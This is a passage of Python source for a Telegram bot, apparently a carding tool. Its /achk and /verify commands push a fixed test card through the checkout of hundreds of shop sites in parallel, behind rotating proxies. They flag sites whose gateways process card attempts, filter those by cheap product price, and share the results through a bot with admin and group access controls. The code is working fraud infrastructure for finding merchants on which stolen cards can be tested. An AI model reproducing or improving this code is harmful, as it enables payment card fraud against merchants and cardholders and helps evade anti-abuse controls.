        file_content += "# DETAILED RESPONSE INFO\n"
        file_content += "=" * 80 + "\n"
        for result in sorted(working_results, key=lambda x: x["url"]):
            response_info = result.get("response_info", "Unknown")
            proxy_display = mask_proxy(result.get("proxy"))
            
            file_content += f"\n{result['url']}\n"
            file_content += f"  Response: {response_info}\n"
            file_content += f"  Proxy: {proxy_display}\n"
    else:
        file_content += "\nNo working sites found.\n"
    
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp:
        tmp.write(file_content)
        tmp_path = tmp.name
    
    try:
        # Remove stop button and update final message
        status_emoji = "⚠️" if was_cancelled else "✅"
        status_text = "Stopped" if was_cancelled else "Check complete"
        
        summary_parts = [f"✅ Working: {working}", f"⚠️ No Products: {no_products}", f"❌ Failed: {failed}"]
        if was_cancelled and cancelled > 0:
            summary_parts.append(f"⏹ Cancelled: {cancelled}")
        
        # Always update the message, even if stopped
        try:
            await checking_msg.edit_text(
                f"{status_emoji} {status_text}! Sending results as files...\n\n<b>Summary:</b>\n" + "\n".join(summary_parts),
                parse_mode=ParseMode.HTML,
                reply_markup=None  # Remove stop button
            )
        except Exception:
            # If edit fails, try to send a new message
            try:
                await update.message.reply_text(
                    f"{status_emoji} {status_text}!\n\n<b>Summary:</b>\n" + "\n".join(summary_parts),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
        
        # Always send the results file, even if stopped
        try:
            with open(tmp_path, 'rb') as f:
                caption_parts = [f"📊 All URL Check Results", "", f"✅ Working: {working}", f"⚠️ No Products: {no_products}", f"❌ Failed: {failed}"]
                if was_cancelled:
                    caption_parts.append(f"⏹ Cancelled: {cancelled}")
                    caption_parts.append(f"📝 Note: Check was stopped early. Results show {len(results)}/{total_urls} URLs checked.")
                await update.message.reply_document(
                    document=f,
                    filename=f"url_check_results_{total_urls}_urls.txt",
                    caption="\n".join(caption_parts)
                )
        except Exception as e:
            # If file send fails, try to send as text
            try:
                if working_results:
                    working_text = "\n".join([r["url"] for r in sorted(working_results, key=lambda x: x["url"])])
                    await update.message.reply_text(
                        f"📊 Working Sites ({working}):\n\n{working_text[:4000]}",
                        parse_mode=ParseMode.HTML
                    )
            except Exception:
                pass
    finally:
        # Clean up from ACTIVE_BATCHES
        try:
            async with ACTIVE_LOCK:
                ACTIVE_BATCHES.pop(batch_id, None)
        except Exception:
            pass
        
        try:
            os.remove(tmp_path)
        except Exception:
            pass

async def cmd_achk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check URLs from a txt file and filter by minimum amount (use by replying to a txt file with /achk)"""
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("Unauthorized.")
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Please reply to a .txt file with /achk")
        return
    
    doc = update.message.reply_to_message.document
    file_name = doc.file_name or ""
    
    if not file_name.lower().endswith(".txt"):
        await update.message.reply_text("❌ Please reply to a .txt file (not other file types).")
        return
    
    try:
        file = await context.bot.get_file(doc.file_id)
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w+b', suffix='.txt', delete=False) as tmp:
            tmp_path = tmp.name
        await file.download_to_drive(custom_path=tmp_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to download file: {e}")
        return
    
    try:
        with open(tmp_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        try:
            os.remove(tmp_path)
        except Exception:
            pass
        
        # Use the new URL extraction function to handle numbered lists and various formats
        urls = extract_and_validate_urls(file_content)
        
        if not urls:
            await update.message.reply_text(
                "❌ No valid URLs found in the file.\n\n"
                "The file should contain URLs (one per line or space-separated).\n"
                "Supports numbered lists like:\n"
                "26. https://site.com\n"
                "27. https://site2.com"
            )
            return
        
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to read file: {e}")
        try:
            os.remove(tmp_path)
        except Exception:
            pass
        return
    
    total_urls = len(urls)
    
    # Create batch tracking for stop functionality
    import uuid
    batch_id = f"achk_{user.id}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
    cancel_event = asyncio.Event()
    
    # Add stop button
    stop_button = InlineKeyboardMarkup([[InlineKeyboardButton("⏹ Stop", callback_data=f"STOP:{batch_id}")]])
    checking_msg = await update.message.reply_text(
        f"🔍 Checking {total_urls} URL(s) from file...\n\nPlease wait...",
        reply_markup=stop_button
    )
    
    # Register in ACTIVE_BATCHES for stop functionality
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": user.id,
                "progress": (update.effective_chat.id, checking_msg.message_id),
                "type": "achk",
                "total": total_urls,
                "completed": 0,
                "title": f"URL Check with Amount Filter ({total_urls} URLs)"
            }
    except Exception:
        pass
    
    test_card = {
        "number": "4532015112830366",
        "month": 12,
        "year": 2028,
        "verification_value": "123"
    }
    
    saved_proxies = []
    try:
        saved_proxies = await get_user_proxies(user.id)
    except Exception:
        pass
    
    # Increase concurrency for faster processing
    semaphore = asyncio.Semaphore(300)
    completed_count = [0]
    working_count = [0]
    last_update_time = [time.time()]
    is_cancelled = [False]
    
    async def check_single_url(url_input, idx):
        async with semaphore:
            # Check for cancellation
            if cancel_event.is_set() or is_cancelled[0]:
                return {
                    "url": url_input,
                    "emoji": "⚠️",
                    "summary": "Cancelled",
                    "status": "cancelled",
                    "code": "Stopped by user",
                    "amount": None,
                    "amount_value": None,
                    "proxy": None,
                    "response_info": "Cancelled",
                    "idx": idx
                }
            
            # Minimal delay only for very first few to avoid instant burst
            if idx <= 5:
                await asyncio.sleep(random.uniform(0.05, 0.15))
            
            try:
                if not url_input.startswith("http"):
                    site_url = f"https://{url_input}"
                else:
                    site_url = url_input
                
                site_url = site_url.rstrip("/")
                
                proxies_override = None
                if saved_proxies:
                    proxy_url = saved_proxies[(idx - 1) % len(saved_proxies)]
                    proxies_override = {"http": proxy_url, "https": proxy_url}
                
                loop = asyncio.get_event_loop()
                status, code_display, amount_display, site_label, used_proxy, final_site, receipt_id = await loop.run_in_executor(
                    GLOBAL_EXECUTOR,
                    check_single_card,
                    test_card,
                    [site_url],
                    proxies_override,
                    None
                )
                
                # List of error codes that should NOT be considered as working
                non_working_errors = [
                    "DELIVERY_ADDRESS2_REQUIRED",
                    "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED",
                    "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
                    "DELIVERY_COMPANY_REQUIRED"
                ]
                
                code_str = str(code_display).upper()
                has_non_working_error = any(err in code_str for err in non_working_errors)
                
                # Parse amount value
                amount_value = parse_amount(amount_display)
                
                # Only mark as working if code is INCORRECT_NUMBER
                if "INCORRECT_NUMBER" in code_str:
                    emoji = "✅"
                    summary = f"{status.upper() if status else 'WORKING'} - {code_display[:50]}"
                    working_count[0] += 1
                elif "No product" in str(code_display) or "no variant" in str(code_display).lower():
                    emoji = "⚠️"
                    summary = "No Products"
                elif has_non_working_error:
                    emoji = "❌"
                    summary = f"Not Supported - {code_display[:50]}"
                elif "timeout" in str(code_display).lower() or "connect" in str(code_display).lower():
                    emoji = "❌"
                    summary = "Connection Failed"
                else:
                    emoji = "❌"
                    summary = f"Failed - {code_display[:50] if code_display else 'Unknown'}"
                
                completed_count[0] += 1
                
                # Update ACTIVE_BATCHES
                try:
                    async with ACTIVE_LOCK:
                        if batch_id in ACTIVE_BATCHES:
                            ACTIVE_BATCHES[batch_id]["completed"] = completed_count[0]
                except Exception:
                    pass
                
                # Update message less frequently to reduce overhead (every 3 seconds or 100 completions)
                # Skip update if cancelled
                if not cancel_event.is_set() and not is_cancelled[0]:
                    current_time = time.time()
                    if total_urls > 3 and (completed_count[0] % 100 == 0 or (current_time - last_update_time[0]) >= 3.0):
                        last_update_time[0] = current_time
                        try:
                            # Check if still not cancelled before updating
                            async with ACTIVE_LOCK:
                                if batch_id in ACTIVE_BATCHES and not ACTIVE_BATCHES[batch_id].get("cancelled"):
                                    await checking_msg.edit_text(
                                        f"🔍 Checking URLs in parallel...\n\n✅ Completed: {completed_count[0]}/{total_urls}\n💚 Working: {working_count[0]}",
                                        reply_markup=stop_button
                                    )
                        except Exception:
                            pass
                
                return {
                    "url": site_url,
                    "emoji": emoji,
                    "summary": summary,
                    "status": status,
                    "code": code_display,
                    "amount": amount_display,
                    "amount_value": amount_value,
                    "proxy": used_proxy,
                    "response_info": format_response_info(amount_display, code_display, status),
                    "idx": idx
                }
                
            except Exception as e:
                completed_count[0] += 1
                return {
                    "url": site_url if 'site_url' in locals() else url_input,
                    "emoji": "❌",
                    "summary": f"Error: {str(e)[:50]}",
                    "status": "error",
                    "code": str(e),
                    "amount": None,
                    "amount_value": None,
                    "proxy": None,
                    "response_info": f"Error: {str(e)[:50]}",
                    "idx": idx
                }
    
    tasks = [check_single_url(url, idx) for idx, url in enumerate(urls, 1)]
    
    # Store tasks in ACTIVE_BATCHES for cancellation
    try:
        async with ACTIVE_LOCK:
            if batch_id in ACTIVE_BATCHES:
                ACTIVE_BATCHES[batch_id]["tasks"] = tasks
    except Exception:
        pass
    
    try:
        # Check if cancelled before gathering
        if cancel_event.is_set():
            is_cancelled[0] = True
        
        # Wait for tasks with proper cancellation handling
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            is_cancelled[0] = True
            # Get partial results from completed tasks
            results = []
            for t in tasks:
                if t.done():
                    try:
                        r = await t
                        if isinstance(r, dict):
                            results.append(r)
                    except Exception:
                        pass
        
        # Filter out exceptions
        processed_results = []
        for r in results:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, dict):
                processed_results.append(r)
        results = processed_results
    except Exception as e:
        is_cancelled[0] = True
        # Try to get any completed results
        results = []
        for t in tasks:
            if t.done():
                try:
                    r = await t
                    if isinstance(r, dict):
                        results.append(r)
                except Exception:
                    pass
    
    # Check if cancelled - check both event and ACTIVE_BATCHES
    was_cancelled = cancel_event.is_set() or is_cancelled[0]
    try:
        async with ACTIVE_LOCK:
            if batch_id in ACTIVE_BATCHES:
                if ACTIVE_BATCHES[batch_id].get("cancelled"):
                    was_cancelled = True
    except Exception:
        pass
    
    # Clean up from ACTIVE_BATCHES
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES.pop(batch_id, None)
    except Exception:
        pass
    
    results = sorted(results, key=lambda x: x.get("idx", 0))
    
    working = sum(1 for r in results if r["emoji"] == "✅")
    no_products = sum(1 for r in results if r["emoji"] == "⚠️")
    failed = sum(1 for r in results if r["emoji"] == "❌")
    cancelled = sum(1 for r in results if r.get("status") == "cancelled")
    
    # Store results in ACHK_PENDING and ask for amount
    try:
        async with ACHK_LOCK:
            ACHK_PENDING[user.id] = {
                "results": results,
                "total_urls": total_urls,
                "checking_msg": checking_msg,
                "working": working,
                "no_products": no_products,
                "failed": failed,
                "cancelled": cancelled,
                "was_cancelled": was_cancelled
            }
    except Exception:
        pass
    
    # Update message to ask for amount
    try:
        status_emoji = "⚠️" if was_cancelled else "✅"
        status_text = "Stopped" if was_cancelled else "Check complete"
        
        summary_parts = [f"✅ Working: {working}", f"⚠️ No Products: {no_products}", f"❌ Failed: {failed}"]
        if was_cancelled and cancelled > 0:
            summary_parts.append(f"⏹ Cancelled: {cancelled}")
        
        await checking_msg.edit_text(
            f"{status_emoji} {status_text}!\n\n"
            f"<b>Summary:</b>\n" + "\n".join(summary_parts) + "\n\n"
            f"💰 <b>Please enter the minimum amount (e.g., 10.00 or $10.00)</b>\n"
            f"I will show only working sites with product price ≤ this amount.",
            parse_mode=ParseMode.HTML,
            reply_markup=None
        )
    except Exception:
        try:
            await update.message.reply_text(
                f"{status_emoji} {status_text}!\n\n"
                f"<b>Summary:</b>\n" + "\n".join(summary_parts) + "\n\n"
                f"💰 <b>Please enter the minimum amount (e.g., 10.00 or $10.00)</b>\n"
                f"I will show only working sites with product price ≤ this amount.",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

async def handle_achk_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle amount input for /achk command"""
    user = update.effective_user
    text = (update.message.text or "").strip()
    
    # First check if user has pending ACHK results - if not, silently ignore
    has_pending = False
    try:
        async with ACHK_LOCK:
            has_pending = user.id in ACHK_PENDING
    except Exception:
        pass
    
    # If user doesn't have pending ACHK, silently ignore this message
    # This prevents the handler from processing regular messages
    if not has_pending:
        return
    
    # Additional check: only process if message looks like it could be an amount
    # (contains digits or $ sign) - this prevents processing random text
    if not (re.search(r'[\d$]', text)):
        # Message doesn't look like an amount, but user has pending ACHK
        # Don't process it, but also don't send error (might be unrelated message)
        return
    
    # Get pending data (now we know it exists)
    pending_data = None
    try:
        async with ACHK_LOCK:
            if user.id in ACHK_PENDING:
                pending_data = ACHK_PENDING.pop(user.id)
    except Exception:
        pass
    
    # Double check - if somehow pending_data is None, return silently
    if not pending_data:
        return
    
    # Parse amount from text
    min_amount = parse_amount(text)
    if min_amount is None:
        try:
            await update.message.reply_text(
                "❌ Invalid amount format. Please enter a number (e.g., 10.00 or $10.00)\n\n"
                "💰 Please try again with a valid amount:"
            )
            # Re-add to pending so user can try again
            async with ACHK_LOCK:
                ACHK_PENDING[user.id] = pending_data
        except Exception:
            pass
        return
    
    results = pending_data.get("results", [])
    total_urls = pending_data.get("total_urls", 0)
    working = pending_data.get("working", 0)
    no_products = pending_data.get("no_products", 0)
    failed = pending_data.get("failed", 0)
    cancelled = pending_data.get("cancelled", 0)
    was_cancelled = pending_data.get("was_cancelled", False)
    checking_msg = pending_data.get("checking_msg")
    
    # Filter working sites that have amount_value <= min_amount
    # Only include working sites (emoji == "✅") with valid amount_value
    filtered_working = []
    for result in results:
        if result["emoji"] == "✅":
            amount_value = result.get("amount_value")
            if amount_value is not None and amount_value <= min_amount:
                filtered_working.append(result)
    
    # Sort by URL
    filtered_working = sorted(filtered_working, key=lambda x: x["url"])
    
    # Create file with filtered results
    file_content = f"# URL Check Results (Amount Filter: ≤ ${min_amount:.2f}) - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    file_content += f"# Total Checked: {total_urls}\n"
    file_content += f"# Working Sites (All): {working}\n"
    file_content += f"# Working Sites (Amount ≤ ${min_amount:.2f}): {len(filtered_working)}\n"
    file_content += f"# Failed Sites: {failed + no_products}\n"
    file_content += "=" * 80 + "\n\n"
    
    if filtered_working:
        file_content += f"# WORKING SITES (Amount ≤ ${min_amount:.2f})\n"
        file_content += "=" * 80 + "\n"
        for result in filtered_working:
            file_content += f"{result['url']}\n"
        
        file_content += "\n" + "=" * 80 + "\n\n"
        file_content += "# DETAILED RESPONSE INFO\n"
        file_content += "=" * 80 + "\n"
        for result in filtered_working:
            response_info = result.get("response_info", "Unknown")
            proxy_display = mask_proxy(result.get("proxy"))
            amount_display = result.get("amount", "N/A")
            
            file_content += f"\n{result['url']}\n"
            file_content += f"  Amount: {amount_display}\n"
            file_content += f"  Response: {response_info}\n"
            file_content += f"  Proxy: {proxy_display}\n"
    else:
        file_content += f"\nNo working sites found with product price ≤ ${min_amount:.2f}.\n"
    
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp:
        tmp.write(file_content)
        tmp_path = tmp.name
    
    try:
        # Update the checking message
        if checking_msg:
            try:
                await checking_msg.edit_text(
                    f"✅ Filtering complete!\n\n"
                    f"<b>Summary:</b>\n"
                    f"✅ Working (All): {working}\n"
                    f"💰 Working (Amount ≤ ${min_amount:.2f}): {len(filtered_working)}\n"
                    f"⚠️ No Products: {no_products}\n"
                    f"❌ Failed: {failed}\n\n"
                    f"Sending filtered results...",
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
        
        # Send the results file
        try:
            with open(tmp_path, 'rb') as f:
                caption_parts = [
                    f"📊 Filtered URL Check Results",
                    f"💰 Amount Filter: ≤ ${min_amount:.2f}",
                    "",
                    f"✅ Working (All): {working}",
                    f"💰 Working (Filtered): {len(filtered_working)}",
                    f"⚠️ No Products: {no_products}",
                    f"❌ Failed: {failed}"
                ]
                if was_cancelled:
                    caption_parts.append(f"⏹ Cancelled: {cancelled}")
                    caption_parts.append(f"📝 Note: Check was stopped early. Results show {len(results)}/{total_urls} URLs checked.")
                
                await update.message.reply_document(
                    document=f,
                    filename=f"achk_results_filtered_{min_amount:.2f}_{total_urls}_urls.txt",
                    caption="\n".join(caption_parts)
                )
        except Exception as e:
            # If file send fails, try to send as text
            try:
                if filtered_working:
                    working_text = "\n".join([r["url"] for r in filtered_working[:50]])  # Limit to 50 to avoid message too long
                    if len(filtered_working) > 50:
                        working_text += f"\n\n... and {len(filtered_working) - 50} more (see file)"
                    await update.message.reply_text(
                        f"📊 Working Sites (Amount ≤ ${min_amount:.2f}) ({len(filtered_working)}):\n\n{working_text}",
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await update.message.reply_text(
                        f"❌ No working sites found with product price ≤ ${min_amount:.2f}."
                    )
            except Exception:
                pass
    finally:
        try:
            os.remove(tmp_path)
        except Exception:
            pass

async def cmd_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: Verify all sites in working_sites.txt"""
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("Unauthorized.")
        return
    
    # Read all sites from working_sites.txt
    sites_file = "working_sites.txt"
    if not os.path.exists(sites_file):
        await update.message.reply_text(f"❌ {sites_file} not found!")
        return
    
    try:
        sites = checkout.read_sites_from_file(sites_file)
        if not sites:
            await update.message.reply_text(f"❌ No sites found in {sites_file}")
            return
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to read {sites_file}: {e}")
        return
    
    total_sites = len(sites)
    checking_msg = await update.message.reply_text(f"🔍 Verifying all {total_sites} sites from {sites_file}...\n\nPlease wait...")
    
    test_card = {
        "number": "4532015112830366",
        "month": 12,
        "year": 2028,
        "verification_value": "123"
    }
    
    saved_proxies = []
    try:
        saved_proxies = await get_user_proxies(user.id)
    except Exception:
        pass
    
    semaphore = asyncio.Semaphore(10)
    completed_count = [0]
    working_count = [0]
    
    async def check_single_site(site_input, idx):
        async with semaphore:
            try:
                if not site_input.startswith("http"):
                    site_url = f"https://{site_input}"
                else:
                    site_url = site_input
                
                site_url = site_url.rstrip("/")
                
                proxies_override = None
                if saved_proxies:
                    proxy_url = saved_proxies[(idx - 1) % len(saved_proxies)]
                    proxies_override = {"http": proxy_url, "https": proxy_url}
                
                loop = asyncio.get_event_loop()
                status, code_display, amount_display, site_label, used_proxy, final_site, receipt_id = await loop.run_in_executor(
                    GLOBAL_EXECUTOR,
                    check_single_card,
                    test_card,
                    [site_url],
                    proxies_override,
                    None
                )
                
                if status and status != "unknown":
                    emoji = "✅"
                    summary = f"{status.upper()} - {code_display[:50]}"
                    working_count[0] += 1
                elif "No product" in str(code_display) or "no variant" in str(code_display).lower():
                    emoji = "⚠️"
                    summary = "No Products"
                elif "timeout" in str(code_display).lower() or "connect" in str(code_display).lower():
                    emoji = "❌"
                    summary = "Connection Failed"
                else:
                    emoji = "❌"
                    summary = f"Failed - {code_display[:50] if code_display else 'Unknown'}"
                
                completed_count[0] += 1
                if total_sites > 5 and completed_count[0] % 10 == 0:
                    try:
                        await checking_msg.edit_text(f"🔍 Verifying sites in parallel...\n\n✅ Completed: {completed_count[0]}/{total_sites}\n💚 Working: {working_count[0]}")
                    except Exception:
                        pass
                
                return {
                    "url": site_url,
                    "emoji": emoji,
                    "summary": summary,
                    "status": status,
                    "code": code_display,
                    "amount": amount_display,
                    "idx": idx
                }
                
            except Exception as e:
                completed_count[0] += 1
                return {
                    "url": site_url if 'site_url' in locals() else site_input,
                    "emoji": "❌",
                    "summary": f"Error: {str(e)[:50]}",
                    "status": "error",
                    "code": str(e),
                    "amount": None,
                    "idx": idx
                }
    
    tasks = [check_single_site(site, idx) for idx, site in enumerate(sites, 1)]
    results = await asyncio.gather(*tasks)
    
    results = sorted(results, key=lambda x: x.get("idx", 0))
    
    working = sum(1 for r in results if r["emoji"] == "✅")
    no_products = sum(1 for r in results if r["emoji"] == "⚠️")
    failed = sum(1 for r in results if r["emoji"] == "❌")
    
    # Create file with all results
    file_content = f"Site Verification Results ({total_sites} sites)\n"
    file_content += "=" * 50 + "\n\n"
    
    for idx, result in enumerate(results, 1):
        domain = result["url"].replace("https://", "").replace("http://", "").split("/")[0]
        file_content += f"{idx}. {result['emoji']} {domain}\n"
        file_content += f"   {result['summary']}\n"
        if result.get('amount') and result['amount'] != 'N/A':
            file_content += f"   Amount: {result['amount']}\n"
        file_content += "\n"
    
    file_content += "=" * 50 + "\n"
    file_content += f"Summary:\n"
    file_content += f"✅ Working: {working}\n"
    file_content += f"⚠️ No Products: {no_products}\n"
    file_content += f"❌ Failed: {failed}\n"
    
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp:
        tmp.write(file_content)
        tmp_path = tmp.name
    
    # Create second file with only working sites
    working_file_content = f"Working Sites Only ({working} sites)\n"
    working_file_content += "=" * 50 + "\n\n"
    
    for idx, result in enumerate(results, 1):
        if result["emoji"] == "✅":  # Only working sites
            domain = result["url"].replace("https://", "").replace("http://", "").split("/")[0]
            working_file_content += f"{domain}\n"
            working_file_content += f"Status: {result['summary']}\n"
            if result.get('amount') and result['amount'] != 'N/A':
                working_file_content += f"Amount: {result['amount']}\n"
            working_file_content += "\n"
    
    working_file_content += "=" * 50 + "\n"
    working_file_content += f"Total Working Sites: {working}\n"
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp2:
        tmp2.write(working_file_content)
        tmp_path_working = tmp2.name
    
    try:
        await checking_msg.edit_text(
            f"✅ Verification complete! Sending results as files...\n\n"
            f"<b>Summary:</b>\n"
            f"✅ Working: {working}\n"
            f"⚠️ No Products: {no_products}\n"
            f"❌ Failed: {failed}",
            parse_mode=ParseMode.HTML
        )
        
        # Send full results file
        await update.message.reply_document(
            document=open(tmp_path, 'rb'),
            filename=f"site_verification_all_{total_sites}_sites.txt",
            caption=f"📊 All Site Verification Results\n\n✅ Working: {working}\n⚠️ No Products: {no_products}\n❌ Failed: {failed}"
        )
        
        # Send working sites only file
        if working > 0:
            await update.message.reply_document(
                document=open(tmp_path_working, 'rb'),
                filename=f"site_verification_working_{working}_sites.txt",
                caption=f"✅ Working Sites Only ({working} sites)\n\nWith response and amounts"
            )
    finally:
        try:
            os.remove(tmp_path)
        except Exception:
            pass
        try:
            os.remove(tmp_path_working)
        except Exception:
            pass

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("Unauthorized.")
        return

    help_text = (
        "🛠 Admin commands:\n\n"
        "📊 Stats & Users:\n"
        "• /stats — Show aggregate user stats\n"
        "• /resetstats — Reset all user stats\n"
        "• /me — Show your personal stats\n"
        "• /active — Show current active checks and progress\n"
        "• /site — Show number of active sites\n"
        "• /chksite <url> — Test if a site works\n"
        "• /chk — Check URLs from txt file (reply to file with /chk)\n"
        "• /verify — Verify all sites in working_sites.txt (2 files: all + working)\n\n"
        "📢 Broadcast:\n"
        "• /broadcast <message> — Send a message to all known users\n"
        "• /broadcastuser @username <message> — Send a message to a single user\n"
        "• /broadcastactive <message> — Send a message to only active users\n\n"
        "🚫 Access Control:\n"
        "• /restrict all — Block all non-admins\n"
        "• /restrict <user_id>[, ...] — Block specific users\n"
        "• /allowonly <id>[, ...] — Allow only specific user or chat IDs\n"
        "• /unrestrict all — Lift global restrictions and clear allow-only\n"
        "• /unrestrict <user_id>[, ...] — Remove users from block list\n"
        "• /allowuser <user_id> — Allow user to bypass groups-only mode\n"
        "• /rmuser <user_id> — Remove user's bypass permission\n"
        "• /users — List all users in allowuser bypass list\n\n"
        "👤 Admin Management:\n"
        "• /admins — Show all admin user ids\n"
        "• /addadmin <user_id> — Add a new admin\n"
        "• /rmadmin <user_id> — Remove an admin\n"
        "• /giveperm <user_id> <command> — Grant specific command access to a user\n\n"
        "🏷 Group Management:\n"
        "• /addgp <group_id>[, ...] — Add group chat id(s) where bot may be used\n"
        "• /showgp — Show configured allowed group ids and groups-only mode\n"
        "• /delgp <group_id>[, ...] — Remove group id(s) from allowed list\n"
        "• /onlygp — Enable groups-only mode (disable personal chats)\n"
        "• /allowall — Disable groups-only (allow personal chats)\n\n"
        "🔧 Proxy Management:\n"
        "• /show <user_id> — Show proxies for specific user\n"
        "• /chkpr <user_id> — Check proxies for specific user\n"
        "• /rmpr <user_id> <num> [num2] ... — Remove specific proxy(ies) from user\n"
        "• /cleanproxies — Clean up all invalid/junk proxies from database\n\n"
        "🛑 Controls:\n"
        "• /stop — Stop your own running batch(es)\n"
        "• /stopuser <user_id> — Stop specific user's running checks\n"
        "• /rmsite <site_url> — Remove site from working sites list\n"
        "• /addsite <site_url>[, ...] — Add site(s) to working sites list\n"
        "• /resetactive — Reset all active checks\n"
        "• /stopall — Stop all active checks (admin only)\n"
        "• /reboot — Reboot the bot (preserves active batches)\n\n"
        "💳 Price Management:\n"
        "• /setpr <site_url> <amount> — Set minimum charge amount for a site\n\n"
        "ℹ️ Other:\n"
        "• /admin — Show this help message"
    )
    await update.message.reply_text(help_text)

async def cmd_addgp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "addgp"):
        await update.message.reply_text("Unauthorized.")
        return

    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /addgp <group_id> [<group_id> ...]\nExample: /addgp -1002798580895")
        return

    try:
        policy = await get_access_policy()
        allowed_groups = policy.get("allowed_groups") or []
        for tok in args:
            try:
                gid = int(str(tok).strip())
            except Exception:
                continue
            if gid not in allowed_groups:
                allowed_groups.append(gid)
        policy["allowed_groups"] = allowed_groups
        await set_access_policy(policy)
        await update.message.reply_text(f"Added groups: {allowed_groups}")
    except Exception as e:
        await update.message.reply_text(f"Failed to add groups: {e}")

async def cmd_showgp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "showgp"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        policy = await get_access_policy()
        allowed_groups = policy.get("allowed_groups") or []
        groups_only = bool(policy.get("groups_only", False))
        txt = "Allowed groups:\n"
        if not allowed_groups:
            txt += "(none)"
        else:
            for g in allowed_groups:
                txt += f"• {g}\n"
        txt += f"\nGroups-only mode: {groups_only}"
        await update.message.reply_text(txt)
    except Exception as e:
        await update.message.reply_text(f"Failed to read groups: {e}")

async def cmd_onlygp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "onlygp"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        policy = await get_access_policy()
        policy["groups_only"] = True
        await set_access_policy(policy)
        await update.message.reply_text("Bot set to groups-only mode. Personal (private) chats will be denied.")
    except Exception as e:
        await update.message.reply_text(f"Failed to set groups-only: {e}")

async def cmd_allowall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "allowall"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        policy = await get_access_policy()
        # Disable groups-only mode
        policy["groups_only"] = False
        # Clear allow_only list (so all users can access, not just specific IDs)
        policy["allow_only_ids"] = []
        # Disable restrict_all (allow everyone)
        policy["restrict_all"] = False
        await set_access_policy(policy)
        await update.message.reply_text("Bot set to allow personal chats for all users.")
    except Exception as e:
        await update.message.reply_text(f"Failed to allow all users: {e}")

async def cmd_delgp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "delgp"):
        await update.message.reply_text("Unauthorized.")
        return
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /delgp <group_id> [<group_id> ...]")
        return
    try:
        policy = await get_access_policy()
        allowed_groups = set(policy.get("allowed_groups") or [])
        removed = []
        for tok in args:
            try:
                gid = int(str(tok).strip())
            except Exception:
                continue
            if gid in allowed_groups:
                allowed_groups.discard(gid)
                removed.append(gid)
        policy["allowed_groups"] = sorted(list(allowed_groups))
        await set_access_policy(policy)
        await update.message.reply_text(f"Removed groups: {removed}\nCurrent allowed groups: {policy['allowed_groups']}")
    except Exception as e:
        await update.message.reply_text(f"Failed to remove groups: {e}")

async def cmd_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "admins"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        policy = await get_access_policy()
        saved = policy.get("admin_ids") or []
        merged = set(saved) | set(int(x) for x in ADMIN_IDS if isinstance(x, int))
        lines = []
        for a in sorted(merged):
            lines.append(f"• {a}")
        txt = "Admins:\n" + ("\n".join(lines) if lines else "(none)")
        await update.message.reply_text(txt)
    except Exception as e:
        await update.message.reply_text(f"Failed to read admins: {e}")

async def cmd_rmadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "rmadmin"):
        await update.message.reply_text("Unauthorized.")
        return
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /rmadmin <user_id>")
        return
    try:
        target = int(str(args[0]).strip())
    except Exception:
        await update.message.reply_text("Invalid user id")
        return
    try:
        try:
            ADMIN_IDS.discard(target)
        except Exception:
            pass
        policy = await get_access_policy()
        saved = set(policy.get("admin_ids") or [])
        saved.discard(target)
        policy["admin_ids"] = sorted(list(saved))
        
        removed = set(policy.get("removed_admin_ids", []) or [])
        removed.add(target)
        policy["removed_admin_ids"] = sorted(list(removed))
        
        await set_access_policy(policy)
        await update.message.reply_text(f"✅ Removed admin: {target}")
    except Exception as e:
